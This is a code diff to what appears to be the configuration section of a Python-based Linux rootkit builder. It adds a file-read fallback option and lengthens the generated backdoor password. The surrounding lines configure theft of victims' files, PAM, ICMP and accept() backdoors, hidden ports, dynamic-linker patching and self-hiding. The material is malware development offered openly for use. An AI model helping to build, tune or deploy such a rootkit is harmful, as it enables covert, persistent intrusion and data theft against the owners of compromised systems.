@@ -92,6 +92,9 @@ FILE_CLEANSE_TIMER = (60 * 60) * 8         # remove stolen files every 8 hours. 
 # will not be stolen. if SYMLINK_FALLBACK is True then a link will be created in lieu of the copied file. cap of 800mb by default. can be disabled.
 MAX_STEAL_SIZE = (1024 * 1024) * 800
 
+# if mapping the file contents fails, use the original method of reading & writing in blocks.
+ORIGINAL_RW_FALLBACK = False
+
 # when a. copying the file fails
 #     (b. it exceeds MAX_FILE_SIZE)
 #     (c. MAX_STEAL_SIZE has been reached)
@@ -112,10 +115,10 @@ SYMLINK_ONLY = False
 PATCH_DYNAMIC_LINKER = True
 
 
-
 # block size settings for reading target files & writing their copies.
 BLOCKS_COUNT   = 10         # the default value for how many chunks files contents will be divided into.
 MAX_BLOCK_SIZE = 1024 * 32  # if the block size of a target exceeds this value, the block count is incremented until that's no longer the case. 32k default. can be disabled.
+
 
 
 # END OF ROOTKIT SETTINGS
@@ -399,7 +402,7 @@ class Util():
 ut, m = Util(), Magical()
 
 PAM_UNAME = ut.randgarb(alowercase, 7) if PAM_UNAME == None else PAM_UNAME
-BACKDOOR_PASS = ut.randgarb(alowercase+auppercase+digits, 8) if BACKDOOR_PASS == None else BACKDOOR_PASS
+BACKDOOR_PASS = ut.randgarb(alowercase+auppercase+digits, 12) if BACKDOOR_PASS == None else BACKDOOR_PASS
 ACCEPT_PORT = ut.randport() if ACCEPT_PORT == None and USE_ACCEPT_BD == True else ACCEPT_PORT
 
 if NUM_HIDDEN_PORTS <= 0 and len(CUSTOM_PORTS) == 0:
@@ -463,7 +466,8 @@ CHECKTHESE = {
     'PATCH_DYNAMIC_LINKER':PATCH_DYNAMIC_LINKER, 'KEEP_FILE_MODE':KEEP_FILE_MODE,
     'SYMLINK_ONLY':SYMLINK_ONLY,                 'USE_PAM_BD':USE_PAM_BD,
     'USE_ICMP_BD':USE_ICMP_BD,                   'HIDE_MY_ASS':HIDE_MY_ASS,
-    'USE_ACCEPT_BD':USE_ACCEPT_BD,               'LOG_USER_EXEC':LOG_USER_EXEC
+    'USE_ACCEPT_BD':USE_ACCEPT_BD,               'LOG_USER_EXEC':LOG_USER_EXEC,
+    'ORIGINAL_RW_FALLBACK':ORIGINAL_RW_FALLBACK
 }
 
 # paths here suffixed with a '/' are treated as directories by the rootkit.
